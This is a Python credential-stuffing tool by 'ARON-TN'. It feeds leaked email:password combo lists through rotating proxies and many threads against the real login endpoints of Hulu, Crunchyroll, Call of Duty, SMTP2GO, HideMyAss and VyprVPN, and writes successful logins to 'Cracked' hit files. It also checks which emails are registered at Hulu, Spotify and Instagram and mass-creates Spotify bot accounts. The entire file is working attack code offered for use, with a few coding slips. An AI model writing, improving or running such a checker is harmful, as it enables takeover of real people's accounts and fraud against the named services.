#!/usr/bin/python
import sys
import os
import requests
import time
import threading
import random
import json
import string
import urllib3
import hashlib
from bs4 import BeautifulSoup
urllib3.disable_warnings()
def logo():
 print('''
        888888  dP""b8  dP"Yb  8b    d8 8b    d8 88   88 88b 88 88 888888 Yb  dP 
        88__   dP   `" dP   Yb 88b  d88 88b  d88 88   88 88Yb88 88   88    YbdP  
        88""   Yb      Yb   dP 88YbdP88 88YbdP88 Y8   8P 88 Y88 88   88     8P   
        88      YboodP  YbodP  88 YY 88 88 YY 88 `YbodP' 88  Y8 88   88    dP    

                 }-------------{+} Coded By ARON-TN {+}-------------{
    {!} - Note : 
              - Proxies : http
              - If you have any idea for any checker Just Contact Me :
                                                             - FB : facebook.com/amyr.gov.tn
                                                             - Email : Aron.tn.official@gmail.com
                                                             - ICQ : aron.tn
                                                             - Telegram : @aron.tn
    {01} - Hulu Accounts CHECKER (WITH PROXIES)
    {02} - Hulu Emails CHECKER (WITH PROXIES)
    {03} - Spotify Emails CHECKER (WITH PROXIES)
    {04} - crunchyroll Accounts CHECKER (WITH PROXIES)
    {05} - Call of duty Accounts CHECKER (WITH PROXIES)
    {06} - Spotify Auto Accounts Creator (NO PROXIES NEEDED)
    {07} - Instagram Emails Valid CHECKER (WITH PROXIES)
    {08} - Smtp2Go Accounts CHECKER (WITH PROXIES)
    {09} - HMA Accounts CHECKER (NO PROXIES NEEDED)
    {10} - Vypr VPN Accounts CHECKER (NO PROXIES NEEDED)
 ''')
def Folder(directory):
 if not os.path.exists(directory):
  os.makedirs(directory)
def HuluAccounts(user,passw):
 while True:
  try:
   s=requests.Session()
   data={
    "affiliate_name":"apple",
    "friendly_name":"mbconfigs+Iphone",
    "password":passw,
    "product_name":"iPhone7%2C2",
    "serial_number":"00001e854946e42b1cbf418fe7d2dcd64df0",
    "user_email":user,  
   }
   head = {
    'content-type':'application/x-www-form-urlencoded',
    'user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Pragma':'no-cache',
    'Accept':'*/*',
   }  
   tt='http://%s' % (random.sample(listaprx,1)[0])
   s.proxies ={'https':tt}
   response2 = s.post('https://auth.hulu.com/v1/device/password/authenticate',data=data,headers=head,timeout=100).json()
   try :
    response2['message']
    print('[----------------------------------------------]\n [p] Proxy : '+tt+'\n [S] Status : Valid\n [A] Account : '+user+':'+passw+'\n [S] Status : Invalid Password')
   except:
    response2['device_token']
    print('[----------------------------------------------]\n [p] Proxy : '+tt+'\n [S] Status : Valid\n [A] Account : '+user+':'+passw+'\n [S] Status : Cracked')
    f = open("ARON-TN_Cracker/Hulu/Accounts_Hits.txt", "a+")
    f.write('[----------------------------------------------]\n [p] Proxy : '+tt+'\n [S] Status : Valid\n [A] Account : '+user+':'+passw+'\n [S] Status : Cracked\n')
    f.close()
  except Exception as exx:
   continue
  break
def HuluEmails(user):
 while True:
  try:
   s=requests.Session()
   head={
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Pragma":"no-cache",
    "Accept":"*/*",
    "Host":"signup.hulu.com",
    "Referer":"https://signup.hulu.com/account",
   } 
   tt='http://%s' % (random.sample(listaprx,1)[0])
   s.proxies ={'https':tt}
   response = s.post('https://signup.hulu.com/api/v2/accounts/status?email='+email,headers=head,timeout=100).json()
   if str(response['status'])=='existing':
    print('[----------------------------------------------]\n [p] Proxy : '+tt+'\n [S] Status : Valid\n [E] Email : '+user+'\n [S] Status : Valid')
    f = open("ARON-TN_Cracker/Hulu/Emails_Hits.txt", "a+")
    f.write('[----------------------------------------------]\n [p] Proxy : '+tt+'\n [S] Status : Valid\n [A] Account : '+user+':'+passw+'\n [S] Status : Cracked\n')
    f.close()
   elif str(response['status'])=='invalid':
    print('[----------------------------------------------]\n [p] Proxy : '+tt+'\n [S] Status : Valid\n [E] Email : '+user+'\n [S] Status : Invalid')
  except Exception as exx:
   continue
  break
def SpotEmail(email):
 while True:
  try:
   s=requests.Session()
   head={
    'Host':'spclient.wg.spotify.com',
    'Accept':'*/*',
    'Accept-Language':'en, en;q=0.01',
    'Connection':'keep-alive',
    'Accept-Encoding':'gzip, deflate, br',
    'User-Agent':'Spotify/8.5.7 iOS/13.5.1 (iPhone12,8)',
   }
   tt='http://%s' % (random.sample(listaprx,1)[0])
   s.proxies ={'https':tt}
   response = s.get('https://spclient.wg.spotify.com/signup/public/v1/account?email='+email+'&suggest=1&key=bff58e9698f40080ec4f9ad97a2f21e0&validate=1',headers=head).json()
   if response['status']==20:
     print('[----------------------------------------------]\n [p] Proxy : '+tt+'\n [S] Status : Valid\n [E] Email : '+email+'\n [S] Status : Valid')
     f = open("ARON-TN_Cracker/Spotify/Emails_Hits.txt", "a+")
     f.write('Email : '+email+'\n')
     f.close()
   elif response['status']==1:
    print('[----------------------------------------------]\n [p] Proxy : '+tt+'\n [S] Status : Valid\n [E] Email : '+email+'\n [S] Status : Invalid')
  except Exception as exx:
   continue
  break
def crunchyrollAccounts(email,passw):
 while True:
  try:
   s=requests.Session()
   head1={
     "User-Agent":"Dalvik/2.1.0 (Linux; U; Android 5.1.1; google Pixel 2 Build/LMY47I)",
     "Pragma":"no-cache",
     "Accept":"*/*",
     "X-Android-Application-Version-Name":"2.6.0",
     "X-Android-Device-Manufacturer":"Google",
     "X-Android-SDK":"22",
     "Using-Brightcove-Player":"1",
     "X-Android-Application-Version-Code":"457",
     "X-Android-Release":"5.1.1",
     "X-Android-Device-Product":"google Pixel 2",
     "X-Android-Device-Model":"google Pixel 2",
     "X-Android-Device-Is-GoogleTV":"0",
   }
   tt='http://%s' % (random.sample(listaprx,1)[0])
   s.proxies ={'https':tt}
   response1=s.get('http://crunchyroll.com',headers=head1 ,verify=False).text
   amm=s.cookies.get_dict()
   head2 = {
    'content-type':'application/x-www-form-urlencoded',
    'X-Android-Application-Version-Name':'2.6.0',
    'X-Android-Device-Manufacturer':'Google',
    'X-Android-SDK':'22',
    'Using-Brightcove-Player':'1',
    'X-Android-Application-Version-Code':'457',
    'X-Android-Release':'5.1.1',
    'X-Android-Device-Product':'google Pixel 2',
    'X-Android-Device-Model':'google Pixel 2',
    'X-Android-Device-Is-GoogleTV':'0',
    'User-Agent':'Dalvik/2.1.0 (Linux; U; Android 5.1.1; google Pixel 2 Build/LMY47I)',
   }
   data2={
    'account':email,
    'password':passw,
    'locale':'enUS',
    'session_id':amm['session_id'],
   }
   response2=s.post('https://api.crunchyroll.com/login.2.json',data=data2,headers=head2).json()
   try:
    response2['data']['user']
    print('[----------------------------------------------]\n [p] Proxy : '+tt+'\n [S] Status : Valid\n [A] Account : '+email+':'+passw+'\n [S] Status : Cracked')
    f = open("ARON-TN_Cracker/Crunchyroll/Accounts_Hits.txt", "a+")
    f.write('[----------------------------------------------]\n [p] Proxy : '+tt+'\n [S] Status : Valid\n [A] Account : '+email+':'+passw+'\n [S] Status : Cracked\n')
    f.close()   
   except:
    print('[----------------------------------------------]\n [p] Proxy : '+tt+'\n [S] Status : Valid\n [A] Account : '+email+':'+passw+'\n [S] Status : Invalid')
  except Exception as exx:
   continue
  break
def callofduty(email,passw):
 while True:
  try:
   s=requests.Session()
   tt='http://%s' % (random.sample(listaprx,1)[0])
   s.proxies ={'https':tt}
   head1={
     "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
     "Pragma":"no-cache",
     "Accept":"*/*"
   }
   response1=s.get('https://profile.callofduty.com/cod/login?redirectUrl=https%3A%2F%2Fwww.callofduty.com%2F',headers=head1).text
   soup = BeautifulSoup(response1, 'html.parser')
   amir=soup.find(type="hidden")
   csrf=str(amir).replace('<input name="_csrf" type="hidden" value="','').replace('"/>','')
   data2={
    'username':str(email),
    'remember_me':'false',
    'password':str(passw),
    '_csrf':csrf,
   }
   head2={
    "content-type":"application/x-www-form-urlencoded",
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Pragma":"no-cache",
    "Accept":"*/*"
   }
   response2=s.post('https://profile.callofduty.com/do_login?new_SiteId=cod',headers=head2,data=data2).text
   if 'You have entered an invalid email / password combination.' in response2:
    print('[----------------------------------------------]\n [p] Proxy : '+tt+'\n [S] Status : Valid\n [A] Account : '+email+':'+passw+'\n [S] Status : Invalid')
   elif 'My Call of Duty' in response2:
     print('[----------------------------------------------]\n [p] Proxy : '+tt+'\n [S] Status : Valid\n [A] Account : '+email+':'+passw+'\n [S] Status : Cracked')
     f = open("ARON-TN_Cracker/Cod/Accounts_Hits.txt", "a+")
     f.write('[----------------------------------------------]\n [p] Proxy : '+tt+'\n [S] Status : Valid\n [A] Account : '+email+':'+passw+'\n [S] Status : Cracked\n')
     f.close()
  except Exception as exx:
   continue
  break
def spotifyauto():
 while True:
  try:
   s=requests.Session()
   letters = string.ascii_lowercase
   NAME=''.join(random.choice(letters) for i in range(4))
   USR=''.join(random.choice(letters) for i in range(6))
   amm='Bot'+str(USR)+'@aron.tn'
   passw='amir23456@'
   data1={
    'gender':'male',
    'password':passw,
    'password_repeat':passw,
    'birth_month':'8',
    'birth_year':'2000',
    'creation_point':'client_mobile',
    'email':amm,
    'birth_day':'1',
    'displayname':NAME,
    'key':'bff58e9698f40080ec4f9ad97a2f21e0',
    'platform':'iOS-ARM',
    'creation_flow':'mobile_email',
    'iagree':'1',
   }
   head1={
    'content-type':'application/x-www-form-urlencoded',
    'Host':'spclient.wg.spotify.com',
    'Content-Type':'application/x-www-form-urlencoded',
    'Connection':'keep-alive',
    'Accept':'*/*',
    'User-Agent':'Spotify/8.5.7 iOS/13.5.1 (iPhone12,8)',
    'Accept-Language':'fr, en;q=0.01',
    'Content-Length':'283',
    'Accept-Encoding':'gzip, deflate, br',
   }
   response1=s.post('https://spclient.wg.spotify.com/signup/public/v1/account',headers=head1,data=data1).json()
   if str(response1['status'])=='1':
    print('[----------------------------------------------]\n [A] Account : '+amm+':'+passw+'\n [S] Status : Created')
    f = open("ARON-TN_Cracker/Spotify/Accounts_Created.txt", "a+")
    f.write('[----------------------------------------------]\n [A] Account : '+amm+':'+passw+'\n [S] Status : Created\n')
    f.close()
  except Exception as exx:
   continue
  break
def InstaEmail(email):
 while True:
  try:
   head={
    "content-type":"application/x-www-form-urlencoded",
    "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
    "x-csrftoken":"IoOjlJgt3Xstc4rESmEbrxfT2KmOdiry",
    "x-ig-app-id":"936619743392459",
    "x-ig-www-claim":"0",
    "x-instagram-ajax":"0737da2dc667",
    "x-requested-with":"XMLHttpRequest",
    "Pragma":"no-cache",
    "Accept":"*/*",
    "origin":"https://www.instagram.com",
    "referer":"https://www.instagram.com/accounts/password/reset/",
    "sec-fetch-dest":"empty",
    "sec-fetch-mode":"cors",
    "sec-fetch-site":"same-origin",
   }
   data={
    'email_or_username':str(email),
    'recaptcha_challenge_field':'',
   }
   tt='http://%s' % (random.sample(listaprx,1)[0])
   proxies ={'https':tt}
   response=requests.post('https://www.instagram.com/accounts/account_recovery_send_ajax/',headers=head,data=data,proxies=proxies).json()
   if response['status']=='ok':
     print('[----------------------------------------------]\n [p] Proxy : '+tt+'\n [S] Status : Valid\n [E] Email : '+email+'\n [S] Status : Valid')
     f = open("ARON-TN_Cracker/Instagram/Emails_Hits.txt", "a+")
     f.write(str(email)+'\n')
     f.close()
   elif response['status']=='fail':
    print('[----------------------------------------------]\n [p] Proxy : '+tt+'\n [S] Status : Valid\n [E] Email : '+email+'\n [S] Status : Invalid')
  except Exception as exx:
   continue
  break
def smtp2go(user,passw):
 while True:
  try:
   client = requests.session()
   tt='http://%s' % (random.sample(listaprx,1)[0])
   client.proxies ={'https':tt} 
   data={
    'username':str(user),
    'password':str(passw),
    'remember_me_token':'',
   }
   head = {
    'content-type':'application/x-www-form-urlencoded',
    'Frontend-Validation':'true',
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3907.0 Safari/537.36',
    'X-Requested-With':'XMLHttpRequest',
   }
   response = client.post('https://app.smtp2go.com/api/login/',headers=head,data=data,allow_redirects=False).json()
   if response['status'] == 'OK' :
     print('[----------------------------------------------]\n [p] Proxy : '+tt+'\n [S] Status : Valid\n [A] Account : '+user+':'+passw+'\n [S] Status : Cracked')
     f = open("ARON-TN_Cracker/Smtp2go/Accounts_Hits.txt", "a+")
     f.write('[----------------------------------------------]\n [p] Proxy : '+tt+'\n [S] Status : Valid\n [A] Account : '+user+':'+passw+'\n [S] Status : Cracked\n')
     f.close()
   elif response['status'] == 'ERROR':
     print('[----------------------------------------------]\n [p] Proxy : '+tt+'\n [S] Status : Valid\n [A] Account : '+user+':'+passw+'\n [S] Status : Invalid')  
  except Exception as exx:
   continue
  break
def hma(user,passw):
 p = hashlib.md5(passw.encode('utf-8')).hexdigest()
 head = {
  'user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
  'Pragma':'no-cache',
  'Accept':'*/*',
 } 
 response = requests.get('https://vpn.hidemyass.com/vpncontrol/accounts/info28/'+str(user)+'/'+str(p)+'?platform=win64&ver=2.8.24.0&osver=10.0.19041.0&tls=true',headers=head,timeout=100).text
 if 'The username and password you entered are incorrect' in response:
  print('[-] '+str(user)+':'+str(passw)+' ==> Invalid')
 else:
  print('[+] '+str(user)+':'+str(passw)+' ==> Valid')
  f = open("ARON-TN_Cracker/Hma/Hma_Hits.txt", "a+")
  f.write('\n++++++++++++++++++\n'+str(response)+'\nLOGIN:'+str(user)+':'+str(passw))
  f.close()
def VyprVPN(email,passw):
 while True:
  try:
   client = requests.session()
   tt='http://%s' % (random.sample(listaprx,1)[0])
   client.proxies ={'https':tt} 
   head1={
     "User-Agent":"okhttp/3.12.1",
     "username":str(user),
     "password":str(passw),
   }
   response = client.get('https://api.goldenfrog.com/settings',headers=head1)
   if 'invalid username or password' in response.text:
    print('[----------------------------------------------]\n [P] Proxy : '+tt+'\n [S] Status : Valid\n [A] Account : '+user+':'+passw+'\n [S] Status : Invalid')  
   else:
    amir=response.json()
    if amir['vpn']=='null':
     print('[----------------------------------------------]\n [P] Proxy : '+tt+'\n [S] Status : Valid\n [A] Account : '+user+':'+passw+'\n [S] Status : Cracked\n [P] Plan : Free')
     f = open("ARON-TN_Cracker/VyprVPN/FreeAccounts_Hits.txt", "a+")
     f.write('[----------------------------------------------]\n [P] Proxy : '+tt+'\n [S] Status : Valid\n [A] Account : '+user+':'+passw+'\n [S] Status : Cracked\n [P] Plan : Free\n')
     f.close()
    else:
      Plan=str(amir['vpn']['account_level'])
      print('[----------------------------------------------]\n [P] Proxy : '+tt+'\n [S] Status : Valid\n [A] Account : '+user+':'+passw+'\n [S] Status : Cracked\n [P] Plan : '+Plan)
      f = open("ARON-TN_Cracker/VyprVPN/PremiumAccounts_Hits.txt", "a+")
      f.write('[----------------------------------------------]\n [P] Proxy : '+tt+'\n [S] Status : Valid\n [A] Account : '+user+':'+passw+'\n [S] Status : Cracked\n [P] Plan : '+Plan+'\n')
      f.close()
  except Exception as exx:
   continue
  break
logo()
Folder('ARON-TN_Cracker')
try :
 menu=int(input('fcommunity ~# '))
except:
 sys.exit(0)
if menu==1:
 Folder('ARON-TN_Cracker/Hulu')
 txt = input('[X] Combo List (email:pass) : ')
 filep = input('[X] Proxies List (http) : ')
 Threads=input('[X] Threads Number :')
 with open(filep) as fileprx:
  listaprx = fileprx.read().split('\n')
  random.shuffle(listaprx)
 with open(txt) as file:
  lista = file.read().split('\n')
 totalnum = len(lista)
 threadnum = int(Threads)
 threads = []
 for i in lista:
  try:
   user,passw = i.split(':')
  except:
   continue
  thread = threading.Thread(target=HuluAccounts,args=(user.strip(),passw.strip()))
  threads.append(thread)
  thread.start()
elif menu==2:
 Folder('ARON-TN_Cracker/Hulu')
 txt = input('[X] emails List : ')
 filep = input('[X] Proxies List (http) : ')
 Threads=input('[X] Threads Number :')
 with open(filep) as fileprx:
  listaprx = fileprx.read().split('\n')
  random.shuffle(listaprx)
 with open(txt) as file:
  lista = file.read().split('\n')
 threadnum = int(Threads)
 threads = []
 for i in lista:
  thread = threading.Thread(target=HuluEmails,args=(i.strip(),))
  threads.append(thread)
  thread.start()
elif menu==3:
 Folder('ARON-TN_Cracker/Spotify')
 txt = input('[X] emails List : ')
 filep = input('[X] Proxies List (http) : ')
 Threads=input('[X] Threads Number :')
 with open(filep) as fileprx:
  listaprx = fileprx.read().split('\n')
  random.shuffle(listaprx)
 with open(txt) as file:
  lista = file.read().split('\n')
 threadnum = int(Threads)
 threads = []
 for i in lista:
  thread = threading.Thread(target=SpotEmail,args=(i.strip(),))
  threads.append(thread)
  thread.start()
elif menu==4:
 Folder('ARON-TN_Cracker/Crunchyroll')
 txt = input('[X] Combo List (email:pass) : ')
 filep = input('[X] Proxies List (http) : ')
 Threads=input('[X] Threads Number :')
 with open(filep) as fileprx:
  listaprx = fileprx.read().split('\n')
  random.shuffle(listaprx)
 with open(txt) as file:
  lista = file.read().split('\n')
 threadnum = int(Threads)
 threads = []
 for i in lista:
  try:
   user,passw = i.split(':')
  except:
   continue
  thread = threading.Thread(target=crunchyrollAccounts,args=(user.strip(),passw.strip()))
  threads.append(thread)
  thread.start()
elif menu==5:
 Folder('ARON-TN_Cracker/Cod')
 txt = input('[X] Combo List (email:pass) : ')
 filep = input('[X] Proxies List (http) : ')
 Threads=input('[X] Threads Number :')
 with open(filep) as fileprx:
  listaprx = fileprx.read().split('\n')
  random.shuffle(listaprx)
 with open(txt) as file:
  lista = file.read().split('\n')
 threadnum = int(Threads)
 threads = []
 for i in lista:
  try:
   user,passw = i.split(':')
  except:
   continue
  thread = threading.Thread(target=callofduty,args=(user.strip(),passw.strip()))
  threads.append(thread)
  thread.start()
elif menu==6:
 Folder('ARON-TN_Cracker/Spotify')
 while True :
  spotifyauto()
elif menu==7:
 Folder('ARON-TN_Cracker/Instagram')
 txt = input('[X] emails List : ')
 filep = input('[X] Proxies List (http) : ')
 Threads='1'
 with open(filep) as fileprx:
  listaprx = fileprx.read().split('\n')
  random.shuffle(listaprx)
 with open(txt) as file:
  lista = file.read().split('\n')
 threadnum = int(Threads)
 threads = []
 for i in lista:
  thread = threading.Thread(target=InstaEmail,args=(i.strip(),))
  threads.append(thread)
  thread.start()
elif menu==8:
 Folder('ARON-TN_Cracker/Smtp2go')
 txt = input('[X] Combo List (email:pass) : ')
 filep = input('[X] Proxies List (http) : ')
 Threads=input('[X] Threads Number :')
 with open(filep) as fileprx:
   listaprx = fileprx.read().split('\n')
   random.shuffle(listaprx)
 with open(txt) as file:
   lista = file.read().split('\n')
 threadnum = int(Threads)
 threads = []
 for i in lista:
   try:
    user,passw = i.split(':')
   except:
    continue
   thread = threading.Thread(target=smtp2go,args=(user.strip(),passw.strip()))
   threads.append(thread)
   thread.start()
elif menu==9:
 Folder('ARON-TN_Cracker/Hma')
 txt = input('[X] Combo List (email:pass or user:pass) : ')
 Threads=input('[X] Threads Number :')
 with open(txt) as file:
  lista = file.read().split('\n')
 threadnum = int(Threads)
 threads = []
 for i in lista:
  user,passw = i.split(':')
  thread = threading.Thread(target=hma,args=(user.strip(),passw.strip()))
  threads.append(thread)
  thread.start()
elif menu==10:
 Folder('ARON-TN_Cracker/VyprVPN')
 txt = input('[X] Combo List (email:pass) : ')
 filep = input('[X] Proxies List (http) : ')
 Threads=input('[X] Threads Number :')
 with open(filep) as fileprx:
   listaprx = fileprx.read().split('\n')
   random.shuffle(listaprx)
 with open(txt) as file:
   lista = file.read().split('\n')
 threadnum = int(Threads)
 threads = []
 for i in lista:
   try:
    user,passw = i.split(':')
   except:
    continue
   thread = threading.Thread(target=VyprVPN,args=(user.strip(),passw.strip()))
   threads.append(thread)
   thread.start()

